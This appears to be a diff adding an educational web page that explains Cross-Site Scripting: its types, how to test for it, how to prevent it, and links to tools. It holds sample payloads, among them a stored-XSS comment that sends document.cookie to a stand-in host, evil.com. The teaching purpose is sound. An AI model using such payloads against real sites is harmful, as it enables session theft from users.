@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cross-Site Scripting (XSS) - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>💥 Cross-Site Scripting (XSS)</h1>
+    <p class="subtitle">Mastering one of the most common and powerful web vulnerabilities</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>🔎 What is Cross-Site Scripting?</h2>
+      <p>
+        Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It can lead to session hijacking, defacement, redirection, and more. XSS remains a top risk in the OWASP Top 10.
+      </p>
+    </section>
+
+    <section class="types">
+      <h2>📂 Types of XSS</h2>
+
+      <div class="card">
+        <h3>1. Stored XSS</h3>
+        <p>Malicious script is permanently stored on the server (e.g., in a database). When a user loads the page, the script executes automatically.</p>
+      </div>
+
+      <div class="card">
+        <h3>2. Reflected XSS</h3>
+        <p>The payload is reflected off a web server, typically via a query parameter. It executes immediately without being stored.</p>
+      </div>
+
+      <div class="card">
+        <h3>3. DOM-Based XSS</h3>
+        <p>Occurs when the vulnerability is in the client-side JavaScript, modifying the DOM without proper sanitization.</p>
+      </div>
+    </section>
+
+    <section class="examples">
+      <h2>🌐 Real-World Examples</h2>
+
+      <h3>Reflected XSS Example</h3>
+      <pre><code>http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+
+      <p>If the response includes the query directly without sanitization:</p>
+      <pre><code>&lt;div&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code></pre>
+
+      <h3>Stored XSS Example</h3>
+      <p>User posts the following comment:</p>
+      <pre><code>&lt;script&gt;document.location='http://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>
+      <p>If the application renders it to other users without escaping, the attack executes every time the comment loads.</p>
+    </section>
+
+    <section class="step-by-step">
+      <h2>🧠 How XSS Works – Step-by-Step</h2>
+      <ol>
+        <li>The attacker identifies an input field that reflects data unsafely (e.g., URL, form input, comment box).</li>
+        <li>They inject a JavaScript payload (e.g., <code>alert()</code>, data exfiltration).</li>
+        <li>The vulnerable page renders the input as executable code rather than plain text.</li>
+        <li>The victim visits the page, and the script executes in their browser context.</li>
+        <li>Attacker gains control – possibly stealing session cookies, redirecting users, or modifying content.</li>
+      </ol>
+    </section>
+
+    <section class="detection">
+      <h2>🔬 How to Test for XSS</h2>
+      <ul>
+        <li>Use test payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> in parameters or form inputs</li>
+        <li>Inspect HTTP responses to see if input is echoed back unsanitized</li>
+        <li>Use developer tools (DOM inspection) for client-side (DOM-based) XSS</li>
+        <li>Automate testing with tools: <strong>XSStrike</strong>, <strong>Burp Suite</strong>, <strong>OWASP ZAP</strong></li>
+      </ul>
+    </section>
+
+    <section class="prevention">
+      <h2>🛡️ How to Prevent XSS</h2>
+      <ul>
+        <li><strong>Output Encoding:</strong> Encode all dynamic content using libraries like OWASP's ESAPI or built-in frameworks (e.g., React auto-escapes)</li>
+        <li><strong>Input Validation:</strong> Validate and sanitize user input early and strictly</li>
+        <li><strong>Content Security Policy (CSP):</strong> Prevent inline script execution and restrict external resources</li>
+        <li><strong>Use HTTPOnly & Secure cookies:</strong> To protect against session theft</li>
+        <li><strong>Disable eval-like functions:</strong> Avoid using <code>eval()</code>, <code>innerHTML</code>, <code>document.write()</code> unnecessarily</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Pro Tips</h2>
+      <ul>
+        <li>Start by testing URL parameters and user inputs that get reflected</li>
+        <li>Check for filtering mechanisms – try breaking out of HTML tags or attributes</li>
+        <li>Use browser extensions like XSS Radar or XSS Me to test automatically</li>
+        <li>Always confirm execution – seeing your payload in the source code ≠ vulnerability</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Tools & Resources</h2>
+      <ul>
+        <li><a href="https://github.com/s0md3v/XSStrike" target="_blank">XSStrike – XSS detection & exploitation tool</a></li>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS Academy</a></li>
+        <li><a href="https://owasp.org/www-community/xss" target="_blank">OWASP XSS Guide</a></li>
+        <li><a href="https://xss-game.appspot.com/" target="_blank">Google XSS Game (Practice)</a></li>
+        <li><a href="https://www.hacksplaining.com/exercises/xss" target="_blank">Hacksplaining - XSS Interactive Lessons</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
